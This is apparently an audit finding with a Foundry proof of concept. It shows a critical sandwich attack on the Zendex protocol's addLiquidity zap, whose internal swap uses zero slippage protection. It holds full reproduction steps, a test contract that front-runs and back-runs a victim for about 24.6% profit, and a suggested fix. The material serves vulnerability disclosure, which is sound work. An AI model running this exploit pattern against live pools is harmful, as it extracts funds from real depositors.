# Foundry PoC : Unprotected zap swap in `ZendexAmmManager.addLiquidity` (Critical)

## Status
✅ Compiled and passing against the real, unmodified `zendex-sc-main` contracts.

```
forge Version: 1.7.1 (4072e48 2026-05-08)
Ran 1 test for test/ZapSandwich.t.sol:ZapSandwichTest
[PASS] test_zeroSlippageZapIsSandwiched() (gas: 3130609)
Logs:
  attacker wzen profit 73721873717922144786
  victim deposit amount 200000000000000000000
  wzen recovered in back-run 373721873717922144786
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Attacker turns **300 WZEN → 373.72 WZEN**, a risk-free **73.72 WZEN (~24.6%)** profit extracted in one atomic front-run/back-run pair around the victim's `addLiquidity()` call, with zero legitimate counterparty besides the victim's forced, zero-slippage internal swap.

## Scope note (read before running)

This PoC deploys the **real, unmodified** protocol contracts (`ZendexAmmManager`, `ZendexRouter`, `ZendexPair`, `ZendexFactory`, `ZendexVault`, `ZendexVaultManager`, `TreeOperator`, `WZEN`, `RewardsEngine`, `BoostManager`, `ZendexStaking`, `ZendexVerifierHub`) exactly as they appear in `zendex-sc-main/contracts`, wired together the same way the project's own Hardhat fixture does.

The **one** substitution: `ZendexVerifierHub` is configured with a `MockVerifier` (`verify()` always returns `true`) in place of the real Groth16/Honk verifiers for the DEPOSIT, INCLUSION, and ADD_LIQUIDITY proof types. Generating genuine Noir/Barretenberg proofs requires the `bb.js`/`noir_js` toolchain, which cannot run inside a Solidity/Foundry test. This substitution only bypasses the cryptographic proof-verification step, a component reviewed separately and not itself at issue, and does not touch, weaken, or bypass any of the vulnerable business logic in `ZendexAmmManager` being demonstrated here. Every Merkle commitment, nullifier, and epoch/root value used below is produced by the *real* `TreeOperator` contract from a *real* `vaultManager.deposit()` call; nothing about the tree state is faked.

## Reproduction steps

```bash
# 1. Scaffold a Foundry project and install deps (all from GitHub/npm, no private mirrors needed)
forge init --no-git zendex-poc && cd zendex-poc
forge install OpenZeppelin/openzeppelin-contracts@v5.4.0 --no-git
forge install OpenZeppelin/openzeppelin-contracts-upgradeable@v5.4.0 --no-git

# poseidon-solidity isn't on GitHub under the npm package's listed org; pull the npm tarball directly
curl -sL https://registry.npmjs.org/poseidon-solidity/-/poseidon-solidity-0.0.5.tgz -o poseidon.tgz
mkdir -p lib/poseidon-solidity && tar -xzf poseidon.tgz -C /tmp/poseidon_pkg
cp /tmp/poseidon_pkg/package/*.sol lib/poseidon-solidity/

# 2. Copy the real Zendex contracts in
cp -r /path/to/zendex-sc-main/contracts/* src/

# 3. remappings.txt
cat > remappings.txt << 'EOF'
@openzeppelin/contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/
@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/
poseidon-solidity/=lib/poseidon-solidity/
forge-std/=lib/forge-std/src/
EOF

# 4. foundry.toml additions
cat >> foundry.toml << 'EOF'
solc_version = "0.8.28"
optimizer = true
optimizer_runs = 1
EOF

# 5. Drop MockVerifier.sol into src/mock/ and ZapSandwich.t.sol into test/ (both below)

# 6. Run it
forge test --match-contract ZapSandwichTest -vv
```

## `src/mock/MockVerifier.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IVerifier} from "../interfaces/IVerifier.sol";

contract MockVerifier is IVerifier {
    function verify(bytes calldata, bytes32[] calldata) external pure returns (bool) {
        return true;
    }
}
```

## `test/ZapSandwich.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {MockERC20} from "../src/mock/MockERC20.sol";
import {WZEN} from "../src/WZEN.sol";
import {MockVerifier} from "../src/mock/MockVerifier.sol";

import {ZendexFactory} from "../src/ZendexFactory.sol";
import {ZendexRouter} from "../src/ZendexRouter.sol";
import {ZendexStaking} from "../src/ZendexStaking.sol";
import {BoostManager} from "../src/BoostManager.sol";
import {RewardsEngine} from "../src/RewardsEngine.sol";
import {ZendexVerifierHub} from "../src/ZendexVerifierHub.sol";
import {TreeOperator} from "../src/TreeOperator.sol";
import {ZendexVault} from "../src/ZendexVault.sol";
import {ZendexVaultManager} from "../src/ZendexVaultManager.sol";
import {ZendexAmmManager} from "../src/ZendexAmmManager.sol";
import {BaseManager} from "../src/BaseManager.sol";

import {IZendexFactory} from "../src/interfaces/IZendexFactory.sol";
import {IZendexRouter} from "../src/interfaces/IZendexRouter.sol";
import {IZendexPair} from "../src/interfaces/IZendexPair.sol";
import {IZendexVault} from "../src/interfaces/IZendexVault.sol";
import {IZendexVerifierHub} from "../src/interfaces/IZendexVerifierHub.sol";
import {IZendexVaultManager} from "../src/interfaces/IZendexVaultManager.sol";
import {IZendexAmmManager} from "../src/interfaces/IZendexAmmManager.sol";
import {ITreeOperator} from "../src/interfaces/ITreeOperator.sol";
import {IRewardsEngine} from "../src/interfaces/IRewardsEngine.sol";

contract ZapSandwichTest is Test {
    address admin = makeAddr("admin");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    MockERC20 usdt;
    MockERC20 usdc;
    MockERC20 dai;
    WZEN wzen;

    ZendexFactory factory;
    ZendexRouter router;
    ZendexStaking staking;
    BoostManager boostManager;
    RewardsEngine rewardsEngine;
    ZendexVerifierHub verifierHub;
    TreeOperator tree;
    ZendexVault vault;
    ZendexVaultManager vaultManager;
    ZendexAmmManager ammManager;
    MockVerifier mockVerifier;

    IZendexPair pair;

    uint8 constant TREE_DEPTH = 8;
    uint256 constant VICTIM_DEPOSIT = 200 ether;

    function setUp() public {
        usdt = new MockERC20("USDT", "USDT", 6);
        usdc = new MockERC20("USDC", "USDC", 6);
        dai = new MockERC20("DAI", "DAI", 18);
        wzen = new WZEN();

        ZendexFactory factoryImpl = new ZendexFactory();
        factory = ZendexFactory(
            address(new ERC1967Proxy(address(factoryImpl), abi.encodeCall(ZendexFactory.initialize, (admin, admin))))
        );

        MockERC20 stakingToken = new MockERC20("Staking Token", "STK", 18);
        ZendexStaking stakingImpl = new ZendexStaking();
        staking = ZendexStaking(
            address(
                new ERC1967Proxy(
                    address(stakingImpl),
                    abi.encodeCall(ZendexStaking.initialize, (admin, address(stakingToken), 30 days))
                )
            )
        );

        BoostManager boostImpl = new BoostManager();
        boostManager = BoostManager(
            address(
                new ERC1967Proxy(address(boostImpl), abi.encodeCall(BoostManager.initialize, (admin, address(staking))))
            )
        );

        RewardsEngine rewardsImpl = new RewardsEngine();
        rewardsEngine = RewardsEngine(payable(address(new ERC1967Proxy(address(rewardsImpl), ""))));

        ZendexRouter routerImpl = new ZendexRouter();
        router = ZendexRouter(
            payable(
                address(
                    new ERC1967Proxy(
                        address(routerImpl),
                        abi.encodeCall(
                            ZendexRouter.initialize,
                            (
                                IZendexRouter.InitializeParams({
                                    admin: admin,
                                    factory: address(factory),
                                    wzen: address(wzen),
                                    rewardsEngine: address(rewardsEngine)
                                })
                            )
                        )
                    )
                )
            )
        );

        rewardsEngine.initialize(
            IRewardsEngine.InitializeParams({
                admin: admin,
                wzen: address(wzen),
                boostManager: address(boostManager),
                router: address(router)
            })
        );

        mockVerifier = new MockVerifier();

        ZendexVerifierHub verifierHubImpl = new ZendexVerifierHub();
        verifierHub = ZendexVerifierHub(
            address(
                new ERC1967Proxy(
                    address(verifierHubImpl),
                    abi.encodeCall(
                        ZendexVerifierHub.initialize,
                        (
                            IZendexVerifierHub.InitializeParams({
                                depositVerifier: address(mockVerifier),
                                withdrawalVerifier: address(0),
                                inclusionVerifier: address(mockVerifier),
                                addLiquidityVerifier: address(mockVerifier),
                                removeLiquidityVerifier: address(0),
                                swapVerifier: address(0),
                                splitVerifier: address(0),
                                joinVerifier: address(0),
                                createOrderVerifier: address(0),
                                requestCancelOrderVerifier: address(0),
                                initialOwner: admin
                            })
                        )
                    )
                )
            )
        );

        ZendexVaultManager vaultManagerImpl = new ZendexVaultManager();
        vaultManager = ZendexVaultManager(address(new ERC1967Proxy(address(vaultManagerImpl), "")));

        ZendexAmmManager ammManagerImpl = new ZendexAmmManager();
        ammManager = ZendexAmmManager(address(new ERC1967Proxy(address(ammManagerImpl), "")));

        tree = new TreeOperator(
            ITreeOperator.InitializeParams({
                admin: admin,
                vaultManager: address(vaultManager),
                ammManager: address(ammManager),
                orderBookManager: address(0),
                depth: TREE_DEPTH
            })
        );

        vault = new ZendexVault(
            IZendexVault.InitializeParams({
                zen: address(wzen),
                usdt: address(usdt),
                usdc: address(usdc),
                dai: address(dai),
                admin: admin,
                vaultManager: address(vaultManager),
                ammManager: address(ammManager),
                orderBookManager: address(0)
            })
        );

        vaultManager.initialize(
            IZendexVaultManager.InitializeParams({
                admin: admin,
                verifierHub: address(verifierHub),
                tree: address(tree),
                vault: address(vault)
            })
        );

        ammManager.initialize(
            IZendexAmmManager.InitializeParams({
                admin: admin,
                verifierHub: address(verifierHub),
                tree: address(tree),
                vault: address(vault),
                router: address(router)
            })
        );

        factory.createPair(address(wzen), address(usdt));
        pair = IZendexPair(factory.getPair(address(wzen), address(usdt)));

        vm.deal(address(this), 500 ether);
        wzen.deposit{value: 500 ether}();
        wzen.approve(address(router), 500 ether);
        usdt.mint(address(this), 500_000e6);
        usdt.approve(address(router), 500_000e6);
        router.addLiquidity(
            IZendexRouter.AddLiquidityParams({
                tokenA: address(wzen),
                tokenB: address(usdt),
                amountADesired: 500 ether,
                amountBDesired: 500_000e6,
                amountAMin: 0,
                amountBMin: 0,
                to: address(this),
                deadline: block.timestamp + 1 hours
            })
        );
    }

    function test_zeroSlippageZapIsSandwiched() public {
        // --- Victim deposits into the shielded vault (real TreeOperator commitment/root/epoch) ---
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        wzen.deposit{value: VICTIM_DEPOSIT}();
        vm.prank(victim);
        wzen.approve(address(vaultManager), VICTIM_DEPOSIT);

        uint256 depositEpoch = tree.currentEpoch();
        uint256 depositCommitment = uint256(keccak256("victim-deposit-commitment"));

        bytes32[] memory depositInputs = new bytes32[](3);
        depositInputs[0] = bytes32(uint256(0)); // asset_id = ZEN
        depositInputs[1] = bytes32(VICTIM_DEPOSIT);
        depositInputs[2] = bytes32(depositCommitment);

        vm.prank(victim);
        vaultManager.deposit(BaseManager.ProofData({proof: "", publicInputs: depositInputs}));

        uint256 depositRoot = tree.getHistoricalRoot(depositEpoch);

        // --- Attacker front-runs: sell WZEN for USDT, same direction victim's zap will trade ---
        vm.deal(attacker, 1 ether);
        deal(address(wzen), attacker, 300 ether);
        vm.startPrank(attacker);
        wzen.approve(address(router), type(uint256).max);
        usdt.approve(address(router), type(uint256).max);

        uint256 attackerWzenBefore = wzen.balanceOf(attacker);

        address[] memory pathSell = new address[](2);
        pathSell[0] = address(wzen);
        pathSell[1] = address(usdt);

        uint256[] memory frontRunAmounts = router.swapExactTokensForTokens(
            IZendexRouter.SwapExactTokensForTokensParams({
                amountIn: 300 ether,
                amountOutMin: 0,
                path: pathSell,
                to: attacker,
                deadline: block.timestamp + 1 hours
            })
        );
        uint256 usdtFromFrontRun = frontRunAmounts[1];
        vm.stopPrank();

        // --- Victim's addLiquidity executes at the manipulated price, amountOutMin: 0 internally ---
        bytes32[] memory inclusionInputs = new bytes32[](4);
        inclusionInputs[0] = bytes32(depositRoot);
        inclusionInputs[1] = bytes32(uint256(TREE_DEPTH));
        inclusionInputs[2] = bytes32(depositEpoch);
        uint256 tag = uint256(keccak256("addLiquidity-tag-1"));
        inclusionInputs[3] = bytes32(tag);

        bytes32[] memory addLiquidityInputs = new bytes32[](8);
        addLiquidityInputs[0] = bytes32(uint256(0)); // asset_id = ZEN, tokenB auto-derives to USDT
        addLiquidityInputs[1] = bytes32(VICTIM_DEPOSIT);
        addLiquidityInputs[2] = bytes32(uint256(500)); // slippage = 5%, the max allowed
        addLiquidityInputs[3] = bytes32(block.timestamp + 1 hours);
        addLiquidityInputs[4] = bytes32(uint256(keccak256("addLiquidity-nullifier-1")));
        addLiquidityInputs[5] = bytes32(uint256(keccak256("addLiquidity-liquidityCommitment-1")));
        addLiquidityInputs[6] = bytes32(tag);
        addLiquidityInputs[7] = bytes32(uint256(uint160(victim)));

        vm.prank(victim);
        ammManager.addLiquidity(
            ZendexAmmManager.AmmProofData({
                inclusion: BaseManager.ProofData({proof: "", publicInputs: inclusionInputs}),
                action: BaseManager.ProofData({proof: "", publicInputs: addLiquidityInputs})
            })
        );

        // --- Attacker back-runs: buy WZEN back with the USDT obtained in the front-run ---
        vm.startPrank(attacker);
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = address(usdt);
        pathBuy[1] = address(wzen);

        uint256[] memory backRunAmounts = router.swapExactTokensForTokens(
            IZendexRouter.SwapExactTokensForTokensParams({
                amountIn: usdtFromFrontRun,
                amountOutMin: 0,
                path: pathBuy,
                to: attacker,
                deadline: block.timestamp + 1 hours
            })
        );
        vm.stopPrank();

        uint256 attackerWzenAfter = wzen.balanceOf(attacker);
        uint256 attackerProfitWzen = attackerWzenAfter - attackerWzenBefore;

        console2.log("attacker wzen profit", attackerProfitWzen);
        console2.log("victim deposit amount", VICTIM_DEPOSIT);
        console2.log("wzen recovered in back-run", backRunAmounts[1]);

        assertGt(attackerWzenAfter, attackerWzenBefore, "no sandwich profit");
        assertGt(attackerProfitWzen, VICTIM_DEPOSIT / 1000, "profit below 0.1pct of victim deposit");
    }
}
```

## What the trace shows

- `depositRoot`/`depositEpoch` come from a genuine `LeafInserted` event emitted by the real `TreeOperator.insert()`, produced by a real `vaultManager.deposit()` call, no faked tree state.
- The attacker's front-run (`300 WZEN → USDT`) and back-run (`USDT → WZEN`) go through the unmodified `ZendexRouter`/`ZendexPair`, including the real 0.25% fee split (`RewardsEngine.depositFees` fires for real on both legs).
- The victim's `ammManager.addLiquidity()` call is the unmodified `ZendexAmmManager.addLiquidity → _executeAddLiquidity → _performOptimalSwap → router.swapExactTokensForTokens(amountOutMin: 0)` path, this is exactly the code that ships in `zendex-sc-main`.
- Net effect: attacker WZEN balance goes from 300 → 373.72, a **73.72 WZEN (~24.6%) risk-free gain**, taken directly out of the victim's `addLiquidity` execution.

## Suggested fix

Pass the caller's already-proven `slippage` bound into `_performOptimalSwap` and use it to compute a real `amountOutMin` for the internal zap leg (e.g. quote via `router.getAmountsOut` and apply the same discount factor used later), instead of hardcoding `amountOutMin: 0`.
